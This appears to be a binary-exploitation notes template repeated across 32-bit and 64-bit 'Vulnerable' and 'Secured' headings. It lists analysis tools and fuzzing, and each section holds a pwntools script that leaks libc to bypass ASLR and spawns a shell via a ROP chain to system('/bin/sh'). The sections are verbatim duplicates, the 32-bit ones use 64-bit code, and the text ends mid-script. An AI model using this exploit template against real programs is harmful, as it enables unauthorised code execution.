# 32 Bit

## Vulnerable

#### File
```bash
file binary_name
```

#### checksec
```bash
pwn checksec binary_name
```

#### ldd
```bash
ldd binary_name
```

#### grep
```bash
grep -i "pattern" binary_name
```

#### readelf
```bash
# elf metadata
readelf -h binary_name
# library fil meta data
readelf -hs lib*.so
```

#### Signature check
```bash
readelf -S binary_name | grep -E "sig|signature"
elfsign verify -e ./binary_name
objdump -h binary_name | grep -E "sig|signature"
```

#### nm / nm -D
```bash
# list symbols - static mode
nm lib*.so
# list symbols - dynamic mode
nm -D lib*.so
# demangle the symbols
nm -D --demangle lib*.so
```

#### strings
```bash
strings binary_name | fzf
```

#### strace / ltrace
```bash
# system calls trace
strace ./binary_name
# -f: follow forks (child processes)
# -s <size>: specify the maximum string size to print (default is 32)
# -o <file>: write the output to a file instead of stderr
# -p <pid>: attach to a running process
# -e <expr>: a qualifying expression (e.g., -e trace=open,close,read,write)
strace -f -s 1024 -o strace.out ./binary_name

# library calls trace
ltrace ./binary_name
# -f: follow forks
# -s <size>: specify the maximum string size to print
# -o <file>: write the output to a file
# -p <pid>: attach to a running process
# -e <expr>: trace specific library calls (e.g., -e 'malloc*')
# -i: print instruction pointer at time of library call
# -C: demangle C++ symbols
ltrace -f -s 1024 -o ltrace.out ./binary_name
```

#### objdump
```bash
# section analysis
objdump -s --section .rodata binary_name # .rodata
# assembly instructions
objdump -d binary_name
```

#### gdb / r2
```bash
# start gdb
gdb binary_name
# gdb commands
info functions # ; list all the functions
disass main # ; disassmeble main function
b *memory_address # ; breakpoint
run # ; executes the binary
display/i $pc # ; display instruction at the current program counter
info registers rax # ; inspect the contents of rax register
x/s memory_address # ; inspect stack
quit # ; exit gdb

## advanced
info files # ; symbols, entry points will be listed
set pagination off # ; doesnt breaks the output
set logging on # ; output will be copied to gdb.txt
set logging redirect on # ; output will be redirect to gdb.txt

# start r2
r2 -A binary_name
# r2 commadns
aaa # ; analyze all
afl # ; list functions
info # ; show binary information
pdf @ main # ; disassemble main function
db address # ; breakpoint
dc # ; continue execution
dr  / dr rax # ; show registers / show rax register
dps # ; show program stack
dm / dmm # ; list memory maps
px @ rsp # ; show memory at register pointer
dmp address size # ; dump meomory regision
q # ; quit

## advanced
agg # ; Graph view in CLI 
agf @ main # ; Function graph for 'main'
/ str Secret # ; search for string "Secret" in the binary
/a call # ; searches for 'call' instructions
```

#### GDB Memory Analysis
```gdb
# GDB provides powerful commands to examine memory.

# x: examine memory
# Usage: x/[count][format][size] address
#
# count: number of units to display
# format: d(ecimal), x(hex), o(ctal), s(tring), i(nstruction), c(har)
# size: b(yte), h(alfword, 2 bytes), w(ord, 4 bytes), g(iant, 8 bytes)

# Examples:
x/32gx $rsp      # ; show 32 giant words (qwords) from the stack pointer in hex
x/10i $rip      # ; show 10 instructions from the instruction pointer
x/s 0x4005a0    # ; show string at address
x/40wx 0x7fffffffe1f0 # ; show 40 words (dwords) in hex

# info proc mappings: show memory mappings of the process
info proc mappings

# find: search memory for a sequence of bytes
# find [start_addr], [end_addr], <byte1>, <byte2>, ...
find 0x400000, 0x401000, 0x55, 0x48, 0x89, 0xe5

# Using GDB extensions like pwndbg/gef makes this much easier:
# vmmap: show memory mappings with permissions
# telescope: show stack/heap with context (pointers, strings)
# heap: show detailed heap layout (pwndbg)
# bins: show malloc bins (pwndbg)
```

#### Bypassing ASLR with a Leak
```python
# ASLR (Address Space Layout Randomization) randomizes the base address
# of libraries, stack, and heap. To bypass it, you need an info leak.

# 1. Find a vulnerability that leaks an address (e.g., a format string
#    vulnerability or an out-of-bounds read).
# 2. The leaked address will be a pointer into a randomized region,
#    often a libc address or a stack address.
# 3. Calculate the base address of that region. You need to know the
#    version of the library (e.g., libc) on the target system to know
#    the offset of the leaked function from the library's base.

# Example exploit logic using pwntools:
from pwn import *

# --- Setup ---
# Assumes a local binary, but could be a remote connection
p = process('./binary_with_leak')
# ELF objects help find symbol offsets
elf = ELF('./binary_with_leak')
# You need the specific libc version of the target
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# --- Leak Phase ---
# Assume we have a vulnerability to leak the address of 'puts' from the GOT
# The payload to trigger the leak depends on the vulnerability
leak_payload = b'...'
p.sendline(leak_payload)

# Receive and parse the output to get the leaked address
p.recvuntil(b'some known output before the leak')
leaked_puts_str = p.recvline().strip()
leaked_puts_addr = u64(leaked_puts_str.ljust(8, b'\x00'))
log.info(f"Leaked puts address: {hex(leaked_puts_addr)}")

# --- Calculation Phase ---
# Calculate the base address of libc
libc.address = leaked_puts_addr - libc.symbols['puts']
log.info(f"Calculated libc base address: {hex(libc.address)}")

# --- Exploitation Phase ---
# Now you can calculate the address of any other function or gadget in libc
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
# The offset for this gadget must be found with ROPgadget or similar
rop_pop_rdi = libc.address + 0x000000000002155f # Example gadget offset

log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

# Build the final payload using the calculated addresses
payload = b'A' * 104 # Padding to overflow
payload += p64(rop_pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

#### cfg
```bash
objdump -d binary_name | awk '/^[[:xdigit:]]+:/ {address=$1} /call|jmp|je|jne|jg|jl|jz|jnz/ {print address, $0}'
# Ghidra -> Display Function Graph
```

#### Ghidra

#### GDB Extensions (pwndbg/gef/peda)
```bash
# These extensions greatly enhance GDB for exploit development.
# Installation instructions are specific to each tool.

# Example commands in pwndbg/gef:
heap # ; view heap layout
bins # ; view malloc bins
telescope # ; view a region of memory with context (pointers, strings)
vmmap # ; view memory mapping, similar to /proc/pid/maps
ropper # ; search for ROP gadgets (if integrated)

# Note: Choose one extension (pwndbg, gef, or peda) as they
# generally don't work together. They provide similar core
# features but have different UIs and advanced capabilities.
```

#### ROP Gadgets
```bash
# Tools to find gadgets for Return-Oriented Programming (ROP).
ropper -f binary_name --search "pop rdi; ret"

# ROPgadget basic usage to find all gadgets
ROPgadget --binary binary_name

# Search for specific gadgets
ROPgadget --binary binary_name --only "pop|ret"

# Search for specific strings/bytes in the binary
ROPgadget --binary binary_name --string "/bin/sh"

# Generate a simple ROP chain for execve("/bin/sh", 0, 0)
ROPgadget --binary binary_name --ropchain

# Specify bad characters to avoid in gadget addresses
ROPgadget --binary binary_name --bad-chars "000a"

# Note: These tools are essential for building ROP chains to
# bypass security mitigations like NX (Non-executable stack).
```

#### Exploitation Frameworks
```bash
# pwntools is a powerful Python library for writing exploits.
pip install pwntools
```
```python
# Example pwntools script snippet
from pwn import *

# Start the process
p = process('./binary_name')

# Craft a payload
payload = b'A' * 100
payload += p64(0xdeadbeef) # 64-bit address

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()

# Note: pwntools simplifies many tasks like packing/unpacking data,
# interacting with processes, and remote connections.
```

#### Fuzzing
```bash
# AFL++ is a modern, feature-rich fuzzer.

## Instrumented Fuzzing (White-box)
# This is the most effective method. It requires source code to compile
# the binary with instrumentation.
afl-clang-fast -o binary_name_fuzzed source.c
# or for C++
# afl-clang-fast++ -o binary_name_fuzzed source.cpp

# Create input and output directories
mkdir in out
echo "initial seed data" > in/seed.txt

# Run the fuzzer. The '@@' is a placeholder for the input file.
afl-fuzz -i in -o out ./binary_name_fuzzed @@

## Black-box Fuzzing (QEMU mode)
# Use this when you don't have the source code. It's slower.
# The '-Q' flag enables QEMU mode for binary-only targets.
afl-fuzz -Q -i in -o out ./binary_name @@

# Note: Fuzzing is a highly effective technique for discovering
# memory corruption vulnerabilities. Instrumented fuzzing is much
# faster and more efficient than black-box fuzzing.
```

#### Symbolic Execution
```bash
# Angr is a Python framework for symbolic execution and program analysis.
pip install angr
```
```python
# Example Angr script to find a path to a target address
import angr

proj = angr.Project('./binary_name', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)

# Find a path to a specific address (e.g., a "success" message)
target_address = 0x400800
simgr.explore(find=target_address)

if simgr.found:
    solution_state = simgr.found[0]
    print("Solution found!")
    print(solution_state.posix.dumps(0)) # Dump stdin that leads to the solution
else:
    print("No solution found.")

# Note: Symbolic execution explores program paths to find states
# that satisfy certain conditions. It can be used to solve CTF
# challenges or find vulnerabilities.
```

#### conclusion
```shell
# Section to add what I learnt, what I oberved, what changed
```

## Secured

#### File
```bash
file binary_name
```

#### checksec
```bash
pwn checksec binary_name
```

#### ldd
```bash
ldd binary_name
```

#### grep
```bash
grep -i "pattern" binary_name
```

#### readelf
```bash
# elf metadata
readelf -h binary_name
# library fil meta data
readelf -hs lib*.so
```

#### Signature check
```bash
readelf -S binary_name | grep -E "sig|signature"
elfsign verify -e ./binary_name
objdump -h binary_name | grep -E "sig|signature"
```

#### nm / nm -D
```bash
# list symbols - static mode
nm lib*.so
# list symbols - dynamic mode
nm -D lib*.so
# demangle the symbols
nm -D --demangle lib*.so
```

#### strings
```bash
strings binary_name | fzf
```

#### strace / ltrace
```bash
# system calls trace
strace ./binary_name
# -f: follow forks (child processes)
# -s <size>: specify the maximum string size to print (default is 32)
# -o <file>: write the output to a file instead of stderr
# -p <pid>: attach to a running process
# -e <expr>: a qualifying expression (e.g., -e trace=open,close,read,write)
strace -f -s 1024 -o strace.out ./binary_name

# library calls trace
ltrace ./binary_name
# -f: follow forks
# -s <size>: specify the maximum string size to print
# -o <file>: write the output to a file
# -p <pid>: attach to a running process
# -e <expr>: trace specific library calls (e.g., -e 'malloc*')
# -i: print instruction pointer at time of library call
# -C: demangle C++ symbols
ltrace -f -s 1024 -o ltrace.out ./binary_name
```

#### objdump
```bash
# section analysis
objdump -s --section .rodata binary_name # .rodata
# assembly instructions
objdump -d binary_name
```

#### gdb / r2
```bash
# start gdb
gdb binary_name
# gdb commands
info functions # ; list all the functions
disass main # ; disassmeble main function
b *memory_address # ; breakpoint
run # ; executes the binary
display/i $pc # ; display instruction at the current program counter
info registers rax # ; inspect the contents of rax register
x/s memory_address # ; inspect stack
quit # ; exit gdb

## advanced
info files # ; symbols, entry points will be listed
set pagination off # ; doesnt breaks the output
set logging on # ; output will be copied to gdb.txt
set logging redirect on # ; output will be redirect to gdb.txt

# start r2
r2 -A binary_name
# r2 commadns
aaa # ; analyze all
afl # ; list functions
info # ; show binary information
pdf @ main # ; disassemble main function
db address # ; breakpoint
dc # ; continue execution
dr  / dr rax # ; show registers / show rax register
dps # ; show program stack
dm / dmm # ; list memory maps
px @ rsp # ; show memory at register pointer
dmp address size # ; dump meomory regision
q # ; quit

## advanced
agg # ; Graph view in CLI 
agf @ main # ; Function graph for 'main'
/ str Secret # ; search for string "Secret" in the binary
/a call # ; searches for 'call' instructions
```

#### GDB Memory Analysis
```gdb
# GDB provides powerful commands to examine memory.

# x: examine memory
# Usage: x/[count][format][size] address
#
# count: number of units to display
# format: d(ecimal), x(hex), o(ctal), s(tring), i(nstruction), c(har)
# size: b(yte), h(alfword, 2 bytes), w(ord, 4 bytes), g(iant, 8 bytes)

# Examples:
x/32gx $rsp      # ; show 32 giant words (qwords) from the stack pointer in hex
x/10i $rip      # ; show 10 instructions from the instruction pointer
x/s 0x4005a0    # ; show string at address
x/40wx 0x7fffffffe1f0 # ; show 40 words (dwords) in hex

# info proc mappings: show memory mappings of the process
info proc mappings

# find: search memory for a sequence of bytes
# find [start_addr], [end_addr], <byte1>, <byte2>, ...
find 0x400000, 0x401000, 0x55, 0x48, 0x89, 0xe5

# Using GDB extensions like pwndbg/gef makes this much easier:
# vmmap: show memory mappings with permissions
# telescope: show stack/heap with context (pointers, strings)
# heap: show detailed heap layout (pwndbg)
# bins: show malloc bins (pwndbg)
```

#### Bypassing ASLR with a Leak
```python
# ASLR (Address Space Layout Randomization) randomizes the base address
# of libraries, stack, and heap. To bypass it, you need an info leak.

# 1. Find a vulnerability that leaks an address (e.g., a format string
#    vulnerability or an out-of-bounds read).
# 2. The leaked address will be a pointer into a randomized region,
#    often a libc address or a stack address.
# 3. Calculate the base address of that region. You need to know the
#    version of the library (e.g., libc) on the target system to know
#    the offset of the leaked function from the library's base.

# Example exploit logic using pwntools:
from pwn import *

# --- Setup ---
# Assumes a local binary, but could be a remote connection
p = process('./binary_with_leak')
# ELF objects help find symbol offsets
elf = ELF('./binary_with_leak')
# You need the specific libc version of the target
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# --- Leak Phase ---
# Assume we have a vulnerability to leak the address of 'puts' from the GOT
# The payload to trigger the leak depends on the vulnerability
leak_payload = b'...'
p.sendline(leak_payload)

# Receive and parse the output to get the leaked address
p.recvuntil(b'some known output before the leak')
leaked_puts_str = p.recvline().strip()
leaked_puts_addr = u64(leaked_puts_str.ljust(8, b'\x00'))
log.info(f"Leaked puts address: {hex(leaked_puts_addr)}")

# --- Calculation Phase ---
# Calculate the base address of libc
libc.address = leaked_puts_addr - libc.symbols['puts']
log.info(f"Calculated libc base address: {hex(libc.address)}")

# --- Exploitation Phase ---
# Now you can calculate the address of any other function or gadget in libc
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
# The offset for this gadget must be found with ROPgadget or similar
rop_pop_rdi = libc.address + 0x000000000002155f # Example gadget offset

log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

# Build the final payload using the calculated addresses
payload = b'A' * 104 # Padding to overflow
payload += p64(rop_pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

#### cfg
```bash
objdump -d binary_name | awk '/^[[:xdigit:]]+:/ {address=$1} /call|jmp|je|jne|jg|jl|jz|jnz/ {print address, $0}'
# Ghidra -> Display Function Graph
```

#### Ghidra

#### GDB Extensions (pwndbg/gef/peda)
```bash
# These extensions greatly enhance GDB for exploit development.
# Installation instructions are specific to each tool.

# Example commands in pwndbg/gef:
heap # ; view heap layout
bins # ; view malloc bins
telescope # ; view a region of memory with context (pointers, strings)
vmmap # ; view memory mapping, similar to /proc/pid/maps
ropper # ; search for ROP gadgets (if integrated)

# Note: Choose one extension (pwndbg, gef, or peda) as they
# generally don't work together. They provide similar core
# features but have different UIs and advanced capabilities.
```

#### ROP Gadgets
```bash
# Tools to find gadgets for Return-Oriented Programming (ROP).
ropper -f binary_name --search "pop rdi; ret"

# ROPgadget basic usage to find all gadgets
ROPgadget --binary binary_name

# Search for specific gadgets
ROPgadget --binary binary_name --only "pop|ret"

# Search for specific strings/bytes in the binary
ROPgadget --binary binary_name --string "/bin/sh"

# Generate a simple ROP chain for execve("/bin/sh", 0, 0)
ROPgadget --binary binary_name --ropchain

# Specify bad characters to avoid in gadget addresses
ROPgadget --binary binary_name --bad-chars "000a"

# Note: These tools are essential for building ROP chains to
# bypass security mitigations like NX (Non-executable stack).
```

#### Exploitation Frameworks
```bash
# pwntools is a powerful Python library for writing exploits.
pip install pwntools
```
```python
# Example pwntools script snippet
from pwn import *

# Start the process
p = process('./binary_name')

# Craft a payload
payload = b'A' * 100
payload += p64(0xdeadbeef) # 64-bit address

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()

# Note: pwntools simplifies many tasks like packing/unpacking data,
# interacting with processes, and remote connections.
```

#### Fuzzing
```bash
# AFL++ is a modern, feature-rich fuzzer.

## Instrumented Fuzzing (White-box)
# This is the most effective method. It requires source code to compile
# the binary with instrumentation.
afl-clang-fast -o binary_name_fuzzed source.c
# or for C++
# afl-clang-fast++ -o binary_name_fuzzed source.cpp

# Create input and output directories
mkdir in out
echo "initial seed data" > in/seed.txt

# Run the fuzzer. The '@@' is a placeholder for the input file.
afl-fuzz -i in -o out ./binary_name_fuzzed @@

## Black-box Fuzzing (QEMU mode)
# Use this when you don't have the source code. It's slower.
# The '-Q' flag enables QEMU mode for binary-only targets.
afl-fuzz -Q -i in -o out ./binary_name @@

# Note: Fuzzing is a highly effective technique for discovering
# memory corruption vulnerabilities. Instrumented fuzzing is much
# faster and more efficient than black-box fuzzing.
```

#### Symbolic Execution
```bash
# Angr is a Python framework for symbolic execution and program analysis.
pip install angr
```
```python
# Example Angr script to find a path to a target address
import angr

proj = angr.Project('./binary_name', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)

# Find a path to a specific address (e.g., a "success" message)
target_address = 0x400800
simgr.explore(find=target_address)

if simgr.found:
    solution_state = simgr.found[0]
    print("Solution found!")
    print(solution_state.posix.dumps(0)) # Dump stdin that leads to the solution
else:
    print("No solution found.")

# Note: Symbolic execution explores program paths to find states
# that satisfy certain conditions. It can be used to solve CTF
# challenges or find vulnerabilities.
```

#### conclusion
```shell
# Section to add what I learnt, what I oberved, what changed
```

---
# 64 Bit

## Vulnerable

#### File
```bash
file binary_name
```

#### checksec
```bash
pwn checksec binary_name
```

#### ldd
```bash
ldd binary_name
```

#### grep
```bash
grep -i "pattern" binary_name
```

#### readelf
```bash
# elf metadata
readelf -h binary_name
# library fil meta data
readelf -hs lib*.so
```

#### Signature check
```bash
readelf -S binary_name | grep -E "sig|signature"
elfsign verify -e ./binary_name
objdump -h binary_name | grep -E "sig|signature"
```

#### nm / nm -D
```bash
# list symbols - static mode
nm lib*.so
# list symbols - dynamic mode
nm -D lib*.so
# demangle the symbols
nm -D --demangle lib*.so
```

#### strings
```bash
strings binary_name | fzf
```

#### strace / ltrace
```bash
# system calls trace
strace ./binary_name
# -f: follow forks (child processes)
# -s <size>: specify the maximum string size to print (default is 32)
# -o <file>: write the output to a file instead of stderr
# -p <pid>: attach to a running process
# -e <expr>: a qualifying expression (e.g., -e trace=open,close,read,write)
strace -f -s 1024 -o strace.out ./binary_name

# library calls trace
ltrace ./binary_name
# -f: follow forks
# -s <size>: specify the maximum string size to print
# -o <file>: write the output to a file
# -p <pid>: attach to a running process
# -e <expr>: trace specific library calls (e.g., -e 'malloc*')
# -i: print instruction pointer at time of library call
# -C: demangle C++ symbols
ltrace -f -s 1024 -o ltrace.out ./binary_name
```

#### objdump
```bash
# section analysis
objdump -s --section .rodata binary_name # .rodata
# assembly instructions
objdump -d binary_name
```

#### gdb / r2
```bash
# start gdb
gdb binary_name
# gdb commands
info functions # ; list all the functions
disass main # ; disassmeble main function
b *memory_address # ; breakpoint
run # ; executes the binary
display/i $pc # ; display instruction at the current program counter
info registers rax # ; inspect the contents of rax register
x/s memory_address # ; inspect stack
quit # ; exit gdb

## advanced
info files # ; symbols, entry points will be listed
set pagination off # ; doesnt breaks the output
set logging on # ; output will be copied to gdb.txt
set logging redirect on # ; output will be redirect to gdb.txt

# start r2
r2 -A binary_name
# r2 commadns
aaa # ; analyze all
afl # ; list functions
info # ; show binary information
pdf @ main # ; disassemble main function
db address # ; breakpoint
dc # ; continue execution
dr  / dr rax # ; show registers / show rax register
dps # ; show program stack
dm / dmm # ; list memory maps
px @ rsp # ; show memory at register pointer
dmp address size # ; dump meomory regision
q # ; quit

## advanced
agg # ; Graph view in CLI 
agf @ main # ; Function graph for 'main'
/ str Secret # ; search for string "Secret" in the binary
/a call # ; searches for 'call' instructions
```

#### GDB Memory Analysis
```gdb
# GDB provides powerful commands to examine memory.

# x: examine memory
# Usage: x/[count][format][size] address
#
# count: number of units to display
# format: d(ecimal), x(hex), o(ctal), s(tring), i(nstruction), c(har)
# size: b(yte), h(alfword, 2 bytes), w(ord, 4 bytes), g(iant, 8 bytes)

# Examples:
x/32gx $rsp      # ; show 32 giant words (qwords) from the stack pointer in hex
x/10i $rip      # ; show 10 instructions from the instruction pointer
x/s 0x4005a0    # ; show string at address
x/40wx 0x7fffffffe1f0 # ; show 40 words (dwords) in hex

# info proc mappings: show memory mappings of the process
info proc mappings

# find: search memory for a sequence of bytes
# find [start_addr], [end_addr], <byte1>, <byte2>, ...
find 0x400000, 0x401000, 0x55, 0x48, 0x89, 0xe5

# Using GDB extensions like pwndbg/gef makes this much easier:
# vmmap: show memory mappings with permissions
# telescope: show stack/heap with context (pointers, strings)
# heap: show detailed heap layout (pwndbg)
# bins: show malloc bins (pwndbg)
```

#### Bypassing ASLR with a Leak
```python
# ASLR (Address Space Layout Randomization) randomizes the base address
# of libraries, stack, and heap. To bypass it, you need an info leak.

# 1. Find a vulnerability that leaks an address (e.g., a format string
#    vulnerability or an out-of-bounds read).
# 2. The leaked address will be a pointer into a randomized region,
#    often a libc address or a stack address.
# 3. Calculate the base address of that region. You need to know the
#    version of the library (e.g., libc) on the target system to know
#    the offset of the leaked function from the library's base.

# Example exploit logic using pwntools:
from pwn import *

# --- Setup ---
# Assumes a local binary, but could be a remote connection
p = process('./binary_with_leak')
# ELF objects help find symbol offsets
elf = ELF('./binary_with_leak')
# You need the specific libc version of the target
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# --- Leak Phase ---
# Assume we have a vulnerability to leak the address of 'puts' from the GOT
# The payload to trigger the leak depends on the vulnerability
leak_payload = b'...'
p.sendline(leak_payload)

# Receive and parse the output to get the leaked address
p.recvuntil(b'some known output before the leak')
leaked_puts_str = p.recvline().strip()
leaked_puts_addr = u64(leaked_puts_str.ljust(8, b'\x00'))
log.info(f"Leaked puts address: {hex(leaked_puts_addr)}")

# --- Calculation Phase ---
# Calculate the base address of libc
libc.address = leaked_puts_addr - libc.symbols['puts']
log.info(f"Calculated libc base address: {hex(libc.address)}")

# --- Exploitation Phase ---
# Now you can calculate the address of any other function or gadget in libc
system_addr = libc.symbols['system']
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
# The offset for this gadget must be found with ROPgadget or similar
rop_pop_rdi = libc.address + 0x000000000002155f # Example gadget offset

log.info(f"system address: {hex(system_addr)}")
log.info(f"/bin/sh address: {hex(bin_sh_addr)}")

# Build the final payload using the calculated addresses
payload = b'A' * 104 # Padding to overflow
payload += p64(rop_pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

p.sendline(payload)
p.interactive()
```

#### cfg
```bash
objdump -d binary_name | awk '/^[[:xdigit:]]+:/ {address=$1} /call|jmp|je|jne|jg|jl|jz|jnz/ {print address, $0}'
# Ghidra -> Display Function Graph
```

#### Ghidra

#### GDB Extensions (pwndbg/gef/peda)
```bash
# These extensions greatly enhance GDB for exploit development.
# Installation instructions are specific to each tool.

# Example commands in pwndbg/gef:
heap # ; view heap layout
bins # ; view malloc bins
telescope # ; view a region of memory with context (pointers, strings)
vmmap # ; view memory mapping, similar to /proc/pid/maps
ropper # ; search for ROP gadgets (if integrated)

# Note: Choose one extension (pwndbg, gef, or peda) as they
# generally don't work together. They provide similar core
# features but have different UIs and advanced capabilities.
```

#### ROP Gadgets
```bash
# Tools to find gadgets for Return-Oriented Programming (ROP).
ropper -f binary_name --search "pop rdi; ret"

# ROPgadget basic usage to find all gadgets
ROPgadget --binary binary_name

# Search for specific gadgets
ROPgadget --binary binary_name --only "pop|ret"

# Search for specific strings/bytes in the binary
ROPgadget --binary binary_name --string "/bin/sh"

# Generate a simple ROP chain for execve("/bin/sh", 0, 0)
ROPgadget --binary binary_name --ropchain

# Specify bad characters to avoid in gadget addresses
ROPgadget --binary binary_name --bad-chars "000a"

# Note: These tools are essential for building ROP chains to
# bypass security mitigations like NX (Non-executable stack).
```

#### Exploitation Frameworks
```bash
# pwntools is a powerful Python library for writing exploits.
pip install pwntools
```
```python
# Example pwntools script snippet
from pwn import *

# Start the process
p = process('./binary_name')

# Craft a payload
payload = b'A' * 100
payload += p64(0xdeadbeef) # 64-bit address

# Send the payload
p.sendline(payload)

# Interact with the process
p.interactive()

# Note: pwntools simplifies many tasks like packing/unpacking data,
# interacting with processes, and remote connections.
```

#### Fuzzing
```bash
# AFL++ is a modern, feature-rich fuzzer.

## Instrumented Fuzzing (White-box)
# This is the most effective method. It requires source code to compile
# the binary with instrumentation.
afl-clang-fast -o binary_name_fuzzed source.c
# or for C++
# afl-clang-fast++ -o binary_name_fuzzed source.cpp

# Create input and output directories
mkdir in out
echo "initial seed data" > in/seed.txt

# Run the fuzzer. The '@@' is a placeholder for the input file.
afl-fuzz -i in -o out ./binary_name_fuzzed @@

## Black-box Fuzzing (QEMU mode)
# Use this when you don't have the source code. It's slower.
# The '-Q' flag enables QEMU mode for binary-only targets.
afl-fuzz -Q -i in -o out ./binary_name @@

# Note: Fuzzing is a highly effective technique for discovering
# memory corruption vulnerabilities. Instrumented fuzzing is much
# faster and more efficient than black-box fuzzing.
```

#### Symbolic Execution
```bash
# Angr is a Python framework for symbolic execution and program analysis.
pip install angr
```
```python
# Example Angr script to find a path to a target address
import angr

proj = angr.Project('./binary_name', auto_load_libs=False)
state = proj.factory.entry_state()
simgr = proj.factory.simulation_manager(state)

# Find a path to a specific address (e.g., a "success" message)
target_address = 0x400800
simgr.explore(find=target_address)

if simgr.found:
    solution_state = simgr.found[0]
    print("Solution found!")
    print(solution_state.posix.dumps(0)) # Dump stdin that leads to the solution
else:
    print("No solution found.")

# Note: Symbolic execution explores program paths to find states
# that satisfy certain conditions. It can be used to solve CTF
# challenges or find vulnerabilities.
```

#### conclusion
```shell
# Section to add what I learnt, what I oberved, what changed
```
## Secured

#### File
```bash
file binary_name
```

#### checksec
```bash
pwn checksec binary_name
```

#### ldd
```bash
ldd binary_name
```

#### grep
```bash
grep -i "pattern" binary_name
```

#### readelf
```bash
# elf metadata
readelf -h binary_name
# library fil meta data
readelf -hs lib*.so
```

#### Signature check
```bash
readelf -S binary_name | grep -E "sig|signature"
elfsign verify -e ./binary_name
objdump -h binary_name | grep -E "sig|signature"
```

#### nm / nm -D
```bash
# list symbols - static mode
nm lib*.so
# list symbols - dynamic mode
nm -D lib*.so
# demangle the symbols
nm -D --demangle lib*.so
```

#### strings
```bash
strings binary_name | fzf
```

#### strace / ltrace
```bash
# system calls trace
strace ./binary_name
# -f: follow forks (child processes)
# -s <size>: specify the maximum string size to print (default is 32)
# -o <file>: write the output to a file instead of stderr
# -p <pid>: attach to a running process
# -e <expr>: a qualifying expression (e.g., -e trace=open,close,read,write)
strace -f -s 1024 -o strace.out ./binary_name

# library calls trace
ltrace ./binary_name
# -f: follow forks
# -s <size>: specify the maximum string size to print
# -o <file>: write the output to a file
# -p <pid>: attach to a running process
# -e <expr>: trace specific library calls (e.g., -e 'malloc*')
# -i: print instruction pointer at time of library call
# -C: demangle C++ symbols
ltrace -f -s 1024 -o ltrace.out ./binary_name
```

#### objdump
```bash
# section analysis
objdump -s --section .rodata binary_name # .rodata
# assembly instructions
objdump -d binary_name
```

#### gdb / r2
```bash
# start gdb
gdb binary_name
# gdb commands
info functions # ; list all the functions
disass main # ; disassmeble main function
b *memory_address # ; breakpoint
run # ; executes the binary
display/i $pc # ; display instruction at the current program counter
info registers rax # ; inspect the contents of rax register
x/s memory_address # ; inspect stack
quit # ; exit gdb

## advanced
info files # ; symbols, entry points will be listed
set pagination off # ; doesnt breaks the output
set logging on # ; output will be copied to gdb.txt
set logging redirect on # ; output will be redirect to gdb.txt

# start r2
r2 -A binary_name
# r2 commadns
aaa # ; analyze all
afl # ; list functions
info # ; show binary information
pdf @ main # ; disassemble main function
db address # ; breakpoint
dc # ; continue execution
dr  / dr rax # ; show registers / show rax register
dps # ; show program stack
dm / dmm # ; list memory maps
px @ rsp # ; show memory at register pointer
dmp address size # ; dump meomory regision
q # ; quit

## advanced
agg # ; Graph view in CLI 
agf @ main # ; Function graph for 'main'
/ str Secret # ; search for string "Secret" in the binary
/a call # ; searches for 'call' instructions
```

#### GDB Memory Analysis
```gdb
# GDB provides powerful commands to examine memory.

# x: examine memory
# Usage: x/[count][format][size] address
#
# count: number of units to display
# format: d(ecimal), x(hex), o(ctal), s(tring), i(nstruction), c(har)
# size: b(yte), h(alfword, 2 bytes), w(ord, 4 bytes), g(iant, 8 bytes)

# Examples:
x/32gx $rsp      # ; show 32 giant words (qwords) from the stack pointer in hex
x/10i $rip      # ; show 10 instructions from the instruction pointer
x/s 0x4005a0    # ; show string at address
x/40wx 0x7fffffffe1f0 # ; show 40 words (dwords) in hex

# info proc mappings: show memory mappings of the process
info proc mappings

# find: search memory for a sequence of bytes
# find [start_addr], [end_addr], <byte1>, <byte2>, ...
find 0x400000, 0x401000, 0x55, 0x48, 0x89, 0xe5

# Using GDB extensions like pwndbg/gef makes this much easier:
# vmmap: show memory mappings with permissions
# telescope: show stack/heap with context (pointers, strings)
# heap: show detailed heap layout (pwndbg)
# bins: show malloc bins (pwndbg)
```

#### Bypassing ASLR with a Leak
```python
# ASLR (Address Space Layout Randomization) randomizes the base address
# of libraries, stack, and heap. To bypass it, you need an info leak.

# 1. Find a vulnerability that leaks an address (e.g., a format string
#    vulnerability or an out-of-bounds read).
# 2. The leaked address will be a pointer into a randomized region,
#    often a libc address or a stack address.
# 3. Calculate the base address of that region. You need to know the
#    version of the library (e.g., libc) on the target system to know
#    the offset of the leaked function from the library's base.

# Example exploit logic using pwntools:
from pwn import *

# --- Setup ---
# Assumes a local binary, but could be a remote connection
p = process('./binary_with_leak')
# ELF objects help find symbol offsets
elf = ELF('./binary_with_leak')
# You need the specific libc version of the target
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# --- Leak Phase ---
# Assume we have a vulnerability to leak the address of 'puts' from the GOT
# The payload to trigger the leak depends on the vulnerability
leak_payload = b'...'
p.sendline(leak_payload)

# Receive and parse the output to get the leaked address
p.recvuntil(b'some known output before the leak')
leaked_puts_str = p.recvline().strip()
leaked_puts_addr = u64(leaked_puts_str.ljust(8, b'\x00'))
log.info(f"Leaked puts address: {hex(leaked_puts_addr)}")

# --- Calculation Phase ---
# Calculate the base address of libc
libc.address = leaked_puts_addr - libc.symbols['puts']
log.info(f"Calculated libc base address: {hex(libc.address)}")

# --- Exploitation Phase ---
# Now you can calculate the address of any other function or gadget in libc
system_addr = libc.symbols['system']
